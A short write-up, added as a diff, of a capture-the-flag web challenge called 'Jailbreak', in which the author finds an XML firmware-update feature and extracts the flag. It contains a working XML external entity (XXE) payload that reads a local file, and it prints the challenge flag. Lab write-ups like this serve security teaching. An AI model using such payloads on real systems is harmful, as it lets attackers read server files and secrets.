@@ -1,0 +1,28 @@
+Name: Jailbreak
+Type: Web CTF
+Time taken: ~30mins
+
+Opened the provided IP address.
+
+Checked all the provided options - STAT, INV, DATA, MAP, RADIO, ROM
+
+Did not find anything in the first 5.
+
+Found a XML document in ROM.
+
+By running the program found that it checked the version as an input and provided an output accordingly.
+
+Created a XML payload for the file flag.txt: 
+
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [
+<!ENTITY xxe SYSTEM "file:///flag.txt">
+]>
+<FirmwareUpdateConfig>
+<Firmware>
+<Version>&xxe;</Version>
+</Firmware>
+</FirmwareUpdateConfig>
+
+The output provided me with the flag:
+HTB{b1om3tric_l0cks_4nd_fl1cker1ng_l1ghts_8d08b5c0de669eeb7468627e19601269}
